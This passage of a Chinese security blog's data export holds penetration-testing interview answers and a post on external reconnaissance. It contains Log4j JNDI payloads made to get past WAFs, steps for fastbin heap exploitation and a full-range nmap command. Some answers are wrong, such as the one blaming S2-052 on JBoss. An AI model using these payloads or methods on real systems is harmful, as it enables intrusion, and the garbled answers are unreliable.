连接回攻击者的主机。</li>\n<li>Windows Reverse HTTP shellcode：这种 shellcode 可以在 Windows 系统上运行，将一个 HTTP 连接回攻击者的主机。</li>\n<li>Beacon Payload shellcode：这种 shellcode 可以使用 Cobalt Strike 的 Beacon 功能，实现命令执行、文件传输等功能。</li>\n<li>Linux Reverse TCP shellcode：这种 shellcode 可以在 Linux 系统上运行，将一个远程 shell 连接回攻击者的主机。</li>\n<li>Mac Reverse TCP shellcode：这种 shellcode 可以在 Mac 系统上运行，将一个远程 shell 连接回攻击者的主机。</li>\n</ol>\n<h3 id=\"2-6379-8009端口对应的漏洞是\"><a href=\"#2-6379-8009端口对应的漏洞是\" class=\"headerlink\" title=\"2.6379,8009端口对应的漏洞是\"></a>2.6379,8009端口对应的漏洞是</h3><ul>\n<li>6379是redis未授权访问漏洞</li>\n<li>8009是<code>Apache-Tomcat-Ajp漏洞</code>，tomcat默认开启ajp服务（8009端口）</li>\n</ul>\n<h3 id=\"3-Cobalt-strike-可以生成哪些类型的shellcode\"><a href=\"#3-Cobalt-strike-可以生成哪些类型的shellcode\" class=\"headerlink\" title=\"3.Cobalt strike 可以生成哪些类型的shellcode?\"></a>3.Cobalt strike 可以生成哪些类型的shellcode?</h3><p>搜不到。。。</p>\n<h3 id=\"4-Apache-文件解析漏洞的原理？\"><a href=\"#4-Apache-文件解析漏洞的原理？\" class=\"headerlink\" title=\"4.Apache 文件解析漏洞的原理？\"></a>4.Apache 文件解析漏洞的原理？</h3><blockquote>\n<p>apache的解析漏洞依赖于一个特性：apache默认一个文件可以有多个以点分割的后缀，比如test.php.abc，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，知道识别到合法后缀才能进行解析，与windows不同，apache对文件的名解析不是仅仅认识最后一个后缀名，而是从右向左，依此识别，直到遇到自己可以解析的文件为止。</p>\n</blockquote>\n<p>当phpinfo.php被禁止时，phpinfo.php.abc可执行</p>\n<h3 id=\"5-什么中间件存在短文件名漏洞？\"><a href=\"#5-什么中间件存在短文件名漏洞？\" class=\"headerlink\" title=\"5. 什么中间件存在短文件名漏洞？\"></a>5. 什么中间件存在短文件名漏洞？</h3><p><strong>iis</strong></p>\n<h3 id=\"6-xxe漏洞各个语言支持的伪协议有哪些\"><a href=\"#6-xxe漏洞各个语言支持的伪协议有哪些\" class=\"headerlink\" title=\"6.xxe漏洞各个语言支持的伪协议有哪些\"></a>6.xxe漏洞各个语言支持的伪协议有哪些</h3><p>可利用php:&#x2F;&#x2F;filter伪协议</p>\n<h3 id=\"7-S2-052漏洞是由于什么造成的？\"><a href=\"#7-S2-052漏洞是由于什么造成的？\" class=\"headerlink\" title=\"7.S2_052漏洞是由于什么造成的？\"></a>7.S2_052漏洞是由于什么造成的？</h3><p>此漏洞主要是由于<strong>JBoss中 &#x2F;jmx-console&#x2F;HtmlAdaptor 路径对外开放</strong>，并且没有任何身份验证机制，导致攻击者可以进入到JMX控制台，并在其中执行任何功能。</p>\n<h3 id=\"8-Weblogic-常见的漏洞有哪些？\"><a href=\"#8-Weblogic-常见的漏洞有哪些？\" class=\"headerlink\" title=\"8.Weblogic 常见的漏洞有哪些？\"></a>8.Weblogic 常见的漏洞有哪些？</h3><ul>\n<li><strong>XMLDecoder反序列化漏洞</strong></li>\n<li><strong>T3协议反序列化漏洞</strong></li>\n<li><strong>未授权访问漏洞</strong></li>\n<li><strong>命令执行漏洞</strong></li>\n<li><strong>IIOP协议反序列化漏洞</strong></li>\n<li><strong>SSRF漏洞</strong></li>\n</ul>\n<h3 id=\"9-Jboss-常见的漏洞有哪些？\"><a href=\"#9-Jboss-常见的漏洞有哪些？\" class=\"headerlink\" title=\"9.Jboss 常见的漏洞有哪些？\"></a>9.Jboss 常见的漏洞有哪些？</h3><ul>\n<li><strong>访问控制不严导致的漏洞</strong></li>\n<li><strong>反序列化导致的漏洞</strong></li>\n</ul>\n<h3 id=\"10-Struts2-常见的漏洞有哪些？\"><a href=\"#10-Struts2-常见的漏洞有哪些？\" class=\"headerlink\" title=\"10.Struts2 常见的漏洞有哪些？\"></a>10.Struts2 常见的漏洞有哪些？</h3><ul>\n<li>反序列化漏洞</li>\n</ul>\n<h3 id=\"11-Fastbin-怎么利用？\"><a href=\"#11-Fastbin-怎么利用？\" class=\"headerlink\" title=\"11.Fastbin 怎么利用？\"></a>11.Fastbin 怎么利用？</h3><p>使用流程如下：</p>\n<ol>\n<li>申请同样大小的两个内存块，并将它们都释放，这样这两个内存块就会被放入 Fastbin 链表中。</li>\n<li>重新申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回其中一个内存块的地址，作为本次申请的内存块。</li>\n<li>利用本次申请返回的内存块地址，修改其中保存的值为 Fastbin 链表中未释放的内存块的地址。</li>\n<li>再次申请同样大小的内存块，此时 glibc 会从 Fastbin 链表中返回之前修改过的内存块地址，作为本次申请的内存块。</li>\n</ol>\n<h3 id=\"12-Ssrf-攻击的目标为？\"><a href=\"#12-Ssrf-攻击的目标为？\" class=\"headerlink\" title=\"12.Ssrf 攻击的目标为？\"></a>12.Ssrf 攻击的目标为？</h3><p><strong><u>外网无法访问的内部系统</u></strong></p>\n<h3 id=\"13-ssrf-是否可以通过过滤get或post参数进行防御？\"><a href=\"#13-ssrf-是否可以通过过滤get或post参数进行防御？\" class=\"headerlink\" title=\"13.ssrf 是否可以通过过滤get或post参数进行防御？\"></a>13.ssrf 是否可以通过过滤get或post参数进行防御？</h3><p>不行</p>\n<h3 id=\"14-Log4j-怎么绕过？\"><a href=\"#14-Log4j-怎么绕过？\" class=\"headerlink\" title=\"14.Log4j 怎么绕过？\"></a>14.Log4j 怎么绕过？</h3><ul>\n<li><p><strong>不出现port，避免被waf匹配ip:port</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap:192.168.1.1/a&#125;</span><br><span class=\"line\"> $&#123;jndi:ldap:192.168.1.1:/a&#125; </span><br><span class=\"line\">注意此时需要ldap服务端口为389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n</li>\n<li><p><strong>对IP添加包裹</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]/a&#125; </span><br><span class=\"line\">$&#123;jndi:ldap://[192.168.34.96]]/a&#125; </span><br><span class=\"line\"> LdapURL取出&quot;[ip]&quot;，LdapCtx去除[]获得ip，两种情况下端口都是389</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"15-ogg是否是php的伪协议？\"><a href=\"#15-ogg是否是php的伪协议？\" class=\"headerlink\" title=\"15.ogg是否是php的伪协议？\"></a>15.ogg是否是php的伪协议？</h3><p>不是。OGG是一种开放格式的媒体容器，通常用于存储音频和视频文件。它不是PHP的伪协议，PHP的伪协议是一种特殊的协议，用于在PHP中访问各种资源，如文件、网络资源等。PHP的伪协议以特殊的前缀开头，例如file:&#x2F;&#x2F;表示文件协议，http:&#x2F;&#x2F;表示HTTP协议等。</p>\n<h3 id=\"16-Zip-伪协议利用对应的php版本号为？\"><a href=\"#16-Zip-伪协议利用对应的php版本号为？\" class=\"headerlink\" title=\"16. Zip:&#x2F;&#x2F;伪协议利用对应的php版本号为？\"></a>16. Zip:&#x2F;&#x2F;伪协议利用对应的php版本号为？</h3><p><code>zip://</code> 伪协议是在 PHP 5.2.0 版本中引入的，因此在该版本及更高版本的 PHP 中都可以使用。该伪协议允许 PHP 脚本以与本地文件系统相同的方式访问 ZIP 存档文件中的文件。</p>\n<h3 id=\"17-文件上传怎么绕过黑名单-asp后缀的过滤？\"><a href=\"#17-文件上传怎么绕过黑名单-asp后缀的过滤？\" class=\"headerlink\" title=\"17.文件上传怎么绕过黑名单.asp后缀的过滤？\"></a>17.文件上传怎么绕过黑名单.asp后缀的过滤？</h3><h3 id=\"18-Nginx-apache是否存在弱口令？\"><a href=\"#18-Nginx-apache是否存在弱口令？\" class=\"headerlink\" title=\"18.Nginx,apache是否存在弱口令？\"></a>18.Nginx,apache是否存在弱口令？</h3><p>均存在</p>\n<h3 id=\"19-Dom-xss和反射型xss的区别是什么？\"><a href=\"#19-Dom-xss和反射型xss的区别是什么？\" class=\"headerlink\" title=\"19.Dom xss和反射型xss的区别是什么？\"></a>19.Dom xss和反射型xss的区别是什么？</h3><blockquote>\n<p>DOM 型 XSS 漏洞和反射型 XSS 漏洞的区别在于攻击者注入恶意脚本的位置不同。反射型 XSS 漏洞将恶意脚本注入到响应页面中，而 DOM 型 XSS 漏洞将恶意脚本注入到浏览器的 DOM 中。</p>\n</blockquote>\n<h3 id=\"20-Ms17-010漏洞是那个端口造成的？\"><a href=\"#20-Ms17-010漏洞是那个端口造成的？\" class=\"headerlink\" title=\"20.Ms17_010漏洞是那个端口造成的？\"></a>20.Ms17_010漏洞是那个端口造成的？</h3><p>445端口</p>\n<h3 id=\"21-Sqlmap-中要使用随机user-agent应该使用什么参数？\"><a href=\"#21-Sqlmap-中要使用随机user-agent应该使用什么参数？\" class=\"headerlink\" title=\"21.Sqlmap 中要使用随机user-agent应该使用什么参数？\"></a>21.Sqlmap 中要使用随机user-agent应该使用什么参数？</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--random-agent</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"22-Xp-cmdshell-是那个数据库中含有的？\"><a href=\"#22-Xp-cmdshell-是那个数据库中含有的？\" class=\"headerlink\" title=\"22.Xp_cmdshell 是那个数据库中含有的？\"></a>22.Xp_cmdshell 是那个数据库中含有的？</h3><p><code> Microsoft SQL Server 数据库</code></p>\n<h3 id=\"23-Symlink函数是否可以执行系统命令？\"><a href=\"#23-Symlink函数是否可以执行系统命令？\" class=\"headerlink\" title=\"23.Symlink函数是否可以执行系统命令？\"></a>23.Symlink函数是否可以执行系统命令？</h3><p>不可以</p>\n<h3 id=\"24-Samba-wannacry溢出漏洞怎么修复？\"><a href=\"#24-Samba-wannacry溢出漏洞怎么修复？\" class=\"headerlink\" title=\"24.Samba wannacry溢出漏洞怎么修复？\"></a>24.Samba wannacry溢出漏洞怎么修复？</h3><ul>\n<li>升级 Samba：升级到最新版本的 Samba，这将修复许多与安全有关的漏洞，包括 EternalBlue 漏洞。</li>\n<li>禁用 SMBv1：在 Samba 服务器上禁用 SMBv1 协议。这是因为 WannaCry 利用的是 SMBv1 协议的漏洞。在 Windows 系统上禁用 SMBv1 协议同样可以减少系统受到攻击的风险。</li>\n<li>更新操作系统：更新 Windows 操作系统以修补 SMBv1 漏洞。</li>\n<li>加强安全设置：加强 Samba 服务器的安全设置，包括访问控制、身份验证和日志记录等。例如，可以配置防火墙规则以限制对 Samba 服务器的访问，并配置强密码策略以增强身份验证的安全性。</li>\n<li>实施安全性检查：定期对 Samba 服务器进行安全性检查，以确保其处于最新的安全状态，并及时修复发现的漏洞。</li>\n</ul>\n"},{"title":"外网信息搜集","date":"2023-06-19T12:13:33.000Z","excerpt":"外网信息搜集","_content":"\n# 外网信息搜集\n\n### 前言\n\n#### 渗透测试流程\n\n一般来说渗透测试流程 \n\n**外网信息收集=>入口权限突破=>内网信息收集=>权限提升=>横线渗透=>权限维持=>痕迹清理**\n\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n\n# 外网信息搜集\n\n### 前言\n\n#### 渗透测试流程\n\n一般来说渗透测试流程 \n\n**外网信息收集=>入口权限突破=>内网信息收集=>权限提升=>横线渗透=>权限维持=>痕迹清理**\n\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n\n\n\n### 信息搜集\n\n#### 主域名查询\n\n主域名查询可分为备案域名查询和未备案域名查询\n\n- **备案域名查询**\n\n[https://beian.miit.gov.cn](https://beian.miit.gov.cn/#/Integrated/index)\n\n![图片-1687322327126](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png)\n- **未备案域名查询**\n\n  **通过目标已知的网站获取**\n\n  有些企业会把自己的其他业务站点放在网站尾部，里面也许会包含未备案的站点。\n\n  \n\n  **通过fofa等网络空间测绘工具**\n\n  根据相关的语法，可以得到自己想要的信息\n\n![图片-1687322359802](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png)\n\n\n\n#### 子域名获取\n\n这里一般用工具进行，我用过的工具有**layer**，但这个属于爆破了不推荐\n\n目前网上主流的有OneForAll等，这里贴个网址https://github.com/shmilylty/OneForAll\n\n\n\n这里简单说明一些主域名与子域名的关系\n\n> 子域名是主域名的下一级或下下级域名，主域名的改动会对下面的子域名造成影响：\n>\n> 1.主域名解析状态异常时，也会影响子域名的正常使用；\n>\n> 2.对主域名使用通配符证书，其下的子域名也可受到[SSL证书](https://www.sfn.cn/certificate.html)的保护；\n>\n> 3.对主域名进行解析设置，在设置为泛解析的情况下，所有子域名都会指向主域名同样的IP。\n>\n> 4.子域名与子域名之间一般权限都是相互分开的，不会彼此相互影响。\n\n\n\n#### 端口扫描\n\n**原理**：尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。 \n\n**常用工具**：nmap，goby，等\n\n我一般用nmap比较多，这里贴一个常用的命令\n\n```\nnmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml \n```\n\n**在线查询网站**\n\n- 在线端口扫描器：http://duankou.wlphp.com/\n- 站长在线工具：http://www.all-tool.cn/Tools/portblast/\n- MaTools：https://www.matools.com/port\n\n\n\n#### 指纹识别\n\n    1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；\n    \n    2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；\n    \n    3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；\n    \n    4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；\n    \n    5、开发语言：比如PHP、Java、Ruby、Python、C#等；\n    \n    6、操作系统信息：比如linux、win2k8、win7、kali、centos等；\n    \n    7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；\n    \n    8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；\n    \n    9、IP及域名信息：IP和域名注册信息、服务商信息等；\n    \n    10、端口信息：有些软件或平台还会探测服务器开放的常见端口。\n\n\n\n这里推荐一些在线网站和工具\n\n> > **云悉**\n> >\n> > https://www.yunsee.cn/\n> >\n> > **在线识别**\n> >\n> > http://whatweb.bugscaner.com/look/\n> >\n> > **fofa,goby测绘**\n> >\n> > https://fofa.so/\n> >\n> > **wappalyzer插件**\n> >\n> > 火狐，谷歌插件\n> >\n> > **潮汐指纹识别**\n> >\n> > http://finger.tidesec.net/\n> >\n> > **数字观星**\n> >\n> > https://fp.shuziguanxing.com/#/\n> >\n> > **一些工具**\n> >\n> > https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\n\n（潮汐指纹识别超好用压！）\n\n\n\n#### 空间搜索引擎\n\n有时运用空间搜索引擎，可以在最初拿到确定目标时，就找到弱点。\n\n目前比较常见的空间搜索引擎有 **Fofa**、**Shodan**、**360 夸克**、**奇安信全球鹰**、**知道创宇 ZoomEye** 等等。\n\n\n\n#### 目录获取\n\n**工具**：dirsearch，ffuf，御剑\n\nffuf 更侧重于 FFUZ，不过不管是目录扫描还是 FFUZ ，扫描的结果都在于字典，Github 上 4k 多个 star 的字典：https://github.com/TheKingOfDuck/fuzzDicts\n\n\n\n#### 邮箱地址获取\n\n邮箱地址比较常用的方法有直接通过搜索引擎找网上公开的邮箱信息，这种往往会指向目标的网站中，比如目标某个网页的附件中包含有邮箱等信息。\n\n之外还可以使用 Github 搜索目标公司开发者在代码中注释的邮箱信息，其实不太明白为什么开发者都喜欢把自己的邮箱注释到代码里。\n\n也可以通过领英找到目标公司的员工姓名，通过「拼音+@公司域名」的方法去构造员工邮箱。\n\n也有一些网站可以查询邮箱，这种比较方便，比如以下网站：\n\nhttps://www.skymem.info/\n\nhttps://app.snov.io/domain-search\n\nhttps://www.email-format.com/i/search/\n\n另外如果收集到了目标的 outlook 站点，也可以尝试去爆破邮箱用户名\n\n(这方面不太懂，没怎么试过)\n\n\n\n#### 真实ip\n\n由于cdn的存在，我们有时不能直接得到目标的真实ip\n\n**cdn原理：**\n\n就是将源站的资源缓存CDN各个节点上，当请求命中了某个节点的资源缓存时，立即返回客户端，避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验。\n\n\n\n由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。\n这里推荐一个网站可以多个地点ping服务器，\n\nhttps://asm.ca.com/en/ping.php\n\nhttps://ping.chinaz.com/\n\nhttp://www.webkaka.com/ping.aspx\n\n![图片-1687322375738](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png)\n\n- 二级域名发法\n\n目标站点一般不会把二级域名放在cdn上通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。\n\n- nslookup法\n\nhttp://tool.chinaz.com/nslookup\n\n找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。\n\n\n\n- ping法\n\n直接ping example.com而不是[www.example.com，因为现有很多CDN厂商基本只要求把www.example.com](http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/) cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。\n\n\n\n#### c段查询\n\n许多企业在办理宽带时，运营商为企业分配的IP往往都是连续的，所以我们可以通过被测目标的其他公网服务器进行横向到被测目标\n\n**常用在线C段查询网站**：\n\n```\n鹰图：https://hunter.qianxin.com/\n \n FOFA：https://fofa.info/toLogin\n \n 360空间测绘：https://quake.360.net/#/index\n \n 云溪：https://www.yunsee.cn/\n```\n\n\n\n#### whois\n\n可以查询联系人，联系邮箱，创建时间，过期时间等，有利于后面进一步的信息手机\n\n![图片-1687322388065](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png)\n\n\n\n","source":"_posts/外网信息搜集.md","raw":"---\ntitle: 外网信息搜集\ndate: 2023-06-19 20:13:33\nexcerpt: 外网信息搜集\ncategories: 学习\n---\n\n# 外网信息搜集\n\n### 前言\n\n#### 渗透测试流程\n\n一般来说渗透测试流程 \n\n**外网信息收集=>入口权限突破=>内网信息收集=>权限提升=>横线渗透=>权限维持=>痕迹清理**\n\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n\n# 外网信息搜集\n\n### 前言\n\n#### 渗透测试流程\n\n一般来说渗透测试流程 \n\n**外网信息收集=>入口权限突破=>内网信息收集=>权限提升=>横线渗透=>权限维持=>痕迹清理**\n\n信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好\n\n\n\n### 信息搜集\n\n#### 主域名查询\n\n主域名查询可分为备案域名查询和未备案域名查询\n\n- **备案域名查询**\n\n[https://beian.miit.gov.cn](https://beian.miit.gov.cn/#/Integrated/index)\n\n![图片-1687322327126](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png)\n- **未备案域名查询**\n\n  **通过目标已知的网站获取**\n\n  有些企业会把自己的其他业务站点放在网站尾部，里面也许会包含未备案的站点。\n\n  \n\n  **通过fofa等网络空间测绘工具**\n\n  根据相关的语法，可以得到自己想要的信息\n\n![图片-1687322359802](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png)\n\n\n\n#### 子域名获取\n\n这里一般用工具进行，我用过的工具有**layer**，但这个属于爆破了不推荐\n\n目前网上主流的有OneForAll等，这里贴个网址https://github.com/shmilylty/OneForAll\n\n\n\n这里简单说明一些主域名与子域名的关系\n\n> 子域名是主域名的下一级或下下级域名，主域名的改动会对下面的子域名造成影响：\n>\n> 1.主域名解析状态异常时，也会影响子域名的正常使用；\n>\n> 2.对主域名使用通配符证书，其下的子域名也可受到[SSL证书](https://www.sfn.cn/certificate.html)的保护；\n>\n> 3.对主域名进行解析设置，在设置为泛解析的情况下，所有子域名都会指向主域名同样的IP。\n>\n> 4.子域名与子域名之间一般权限都是相互分开的，不会彼此相互影响。\n\n\n\n#### 端口扫描\n\n**原理**：尝试与目标主机建立连接，如果目标主机有回复则说明端口开放。 \n\n**常用工具**：nmap，goby，等\n\n我一般用nmap比较多，这里贴一个常用的命令\n\n```\nnmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml \n```\n\n**在线查询网站**\n\n- 在线端口扫描器：http://duankou.wlphp.com/\n- 站长在线工具：http://www.all-tool.cn/Tools/portblast/\n- MaTools：https://www.matools.com/port\n\n\n\n#### 指纹识别\n\n    1、CMS信息：比如大汉CMS、织梦、帝国CMS、phpcms、ecshop等；\n    \n    2、前端技术：比如HTML5、jquery、bootstrap、pure、ace等；\n    \n    3、Web服务器：比如Apache、lighttpd, Nginx, IIS等；\n    \n    4、应用服务器：比如Tomcat、Jboss、weblogic、websphere等；\n    \n    5、开发语言：比如PHP、Java、Ruby、Python、C#等；\n    \n    6、操作系统信息：比如linux、win2k8、win7、kali、centos等；\n    \n    7、CDN信息：是否使用CDN，如cloudflare、360cdn、365cyd、yunjiasu等；\n    \n    8、WAF信息：是否使用waf，如Topsec、Jiasule、Yundun等；\n    \n    9、IP及域名信息：IP和域名注册信息、服务商信息等；\n    \n    10、端口信息：有些软件或平台还会探测服务器开放的常见端口。\n\n\n\n这里推荐一些在线网站和工具\n\n> > **云悉**\n> >\n> > https://www.yunsee.cn/\n> >\n> > **在线识别**\n> >\n> > http://whatweb.bugscaner.com/look/\n> >\n> > **fofa,goby测绘**\n> >\n> > https://fofa.so/\n> >\n> > **wappalyzer插件**\n> >\n> > 火狐，谷歌插件\n> >\n> > **潮汐指纹识别**\n> >\n> > http://finger.tidesec.net/\n> >\n> > **数字观星**\n> >\n> > https://fp.shuziguanxing.com/#/\n> >\n> > **一些工具**\n> >\n> > https://mp.weixin.qq.com/s/lHIJmIWbm8ylK6yjjmmNkg\n\n（潮汐指纹识别超好用压！）\n\n\n\n#### 空间搜索引擎\n\n有时运用空间搜索引擎，可以在最初拿到确定目标时，就找到弱点。\n\n目前比较常见的空间搜索引擎有 **Fofa**、**Shodan**、**360 夸克**、**奇安信全球鹰**、**知道创宇 ZoomEye** 等等。\n\n\n\n#### 目录获取\n\n**工具**：dirsearch，ffuf，御剑\n\nffuf 更侧重于 FFUZ，不过不管是目录扫描还是 FFUZ ，扫描的结果都在于字典，Github 上 4k 多个 star 的字典：https://github.com/TheKingOfDuck/fuzzDicts\n\n\n\n#### 邮箱地址获取\n\n邮箱地址比较常用的方法有直接通过搜索引擎找网上公开的邮箱信息，这种往往会指向目标的网站中，比如目标某个网页的附件中包含有邮箱等信息。\n\n之外还可以使用 Github 搜索目标公司开发者在代码中注释的邮箱信息，其实不太明白为什么开发者都喜欢把自己的邮箱注释到代码里。\n\n也可以通过领英找到目标公司的员工姓名，通过「拼音+@公司域名」的方法去构造员工邮箱。\n\n也有一些网站可以查询邮箱，这种比较方便，比如以下网站：\n\nhttps://www.skymem.info/\n\nhttps://app.snov.io/domain-search\n\nhttps://www.email-format.com/i/search/\n\n另外如果收集到了目标的 outlook 站点，也可以尝试去爆破邮箱用户名\n\n(这方面不太懂，没怎么试过)\n\n\n\n#### 真实ip\n\n由于cdn的存在，我们有时不能直接得到目标的真实ip\n\n**cdn原理：**\n\n就是将源站的资源缓存CDN各个节点上，当请求命中了某个节点的资源缓存时，立即返回客户端，避免每个请求的资源都通过源站获取，避免网络拥塞、缓解源站压力，保证用户访问资源的速度和体验。\n\n\n\n由CDN的原理，不同的地方去Ping服务器，如果IP不一样，则目标网站肯定使用了CDN。\n这里推荐一个网站可以多个地点ping服务器，\n\nhttps://asm.ca.com/en/ping.php\n\nhttps://ping.chinaz.com/\n\nhttp://www.webkaka.com/ping.aspx\n\n![图片-1687322375738](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437964.png)\n\n- 二级域名发法\n\n目标站点一般不会把二级域名放在cdn上通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。\n\n- nslookup法\n\nhttp://tool.chinaz.com/nslookup\n\n找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。\n\n\n\n- ping法\n\n直接ping example.com而不是[www.example.com，因为现有很多CDN厂商基本只要求把www.example.com](http://www.example.com,因为现有很多cdn厂商基本只要求把www.example.com/) cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。\n\n\n\n#### c段查询\n\n许多企业在办理宽带时，运营商为企业分配的IP往往都是连续的，所以我们可以通过被测目标的其他公网服务器进行横向到被测目标\n\n**常用在线C段查询网站**：\n\n```\n鹰图：https://hunter.qianxin.com/\n \n FOFA：https://fofa.info/toLogin\n \n 360空间测绘：https://quake.360.net/#/index\n \n 云溪：https://www.yunsee.cn/\n```\n\n\n\n#### whois\n\n可以查询联系人，联系邮箱，创建时间，过期时间等，有利于后面进一步的信息手机\n\n![图片-1687322388065](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151437038.png)\n\n\n\n","slug":"外网信息搜集","published":1,"updated":"2024-04-17T08:42:59.614Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7j8000ph776dk2na505","content":"<h1 id=\"外网信息搜集\"><a href=\"#外网信息搜集\" class=\"headerlink\" title=\"外网信息搜集\"></a>外网信息搜集</h1><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><h4 id=\"渗透测试流程\"><a href=\"#渗透测试流程\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h4><p>一般来说渗透测试流程 </p>\n<p><strong>外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理</strong></p>\n<p>信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好</p>\n<h1 id=\"外网信息搜集-1\"><a href=\"#外网信息搜集-1\" class=\"headerlink\" title=\"外网信息搜集\"></a>外网信息搜集</h1><h3 id=\"前言-1\"><a href=\"#前言-1\" class=\"headerlink\" title=\"前言\"></a>前言</h3><h4 id=\"渗透测试流程-1\"><a href=\"#渗透测试流程-1\" class=\"headerlink\" title=\"渗透测试流程\"></a>渗透测试流程</h4><p>一般来说渗透测试流程 </p>\n<p><strong>外网信息收集&#x3D;&gt;入口权限突破&#x3D;&gt;内网信息收集&#x3D;&gt;权限提升&#x3D;&gt;横线渗透&#x3D;&gt;权限维持&#x3D;&gt;痕迹清理</strong></p>\n<p>信息搜集在第一位，也是任务最杂最繁重的。这一部分很关键，我们必须做好</p>\n<h3 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h3><h4 id=\"主域名查询\"><a href=\"#主域名查询\" class=\"headerlink\" title=\"主域名查询\"></a>主域名查询</h4><p>主域名查询可分为备案域名查询和未备案域名查询</p>\n<ul>\n<li><strong>备案域名查询</strong></li>\n</ul>\n<p><a class=\"link\"   href=\"https://beian.miit.gov.cn/#/Integrated/index\" >https://beian.miit.gov.cn<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436515.png\"\n                        alt=\"图片-1687322327126\"\n                 ></p>\n<ul>\n<li><p><strong>未备案域名查询</strong></p>\n<p><strong>通过目标已知的网站获取</strong></p>\n<p>有些企业会把自己的其他业务站点放在网站尾部，里面也许会包含未备案的站点。</p>\n<p><strong>通过fofa等网络空间测绘工具</strong></p>\n<p>根据相关的语法，可以得到自己想要的信息</p>\n</li>\n</ul>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151436630.png\"\n                        alt=\"图片-1687322359802\"\n                 ></p>\n<h4 id=\"子域名获取\"><a href=\"#子域名获取\" class=\"headerlink\" title=\"子域名获取\"></a>子域名获取</h4><p>这里一般用工具进行，我用过的工具有<strong>layer</strong>，但这个属于爆破了不推荐</p>\n<p>目前网上主流的有OneForAll等，这里贴个网址<a class=\"link\"   href=\"https://github.com/shmilylty/OneForAll\" >https://github.com/shmilylty/OneForAll<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>这里简单说明一些主域名与子域名的关系</p>\n<blockquote>\n<p>子域名是主域名的下一级或下下级域名，主域名的改动会对下面的子域名造成影响：</p>\n<p>1.主域名解析状态异常时，也会影响子域名的正常使用；</p>\n<p>2.对主域名使用通配符证书，其下的子域名也可受到<a class=\"link\"   href=\"https://www.sfn.cn/certificate.html\" >SSL证书<i 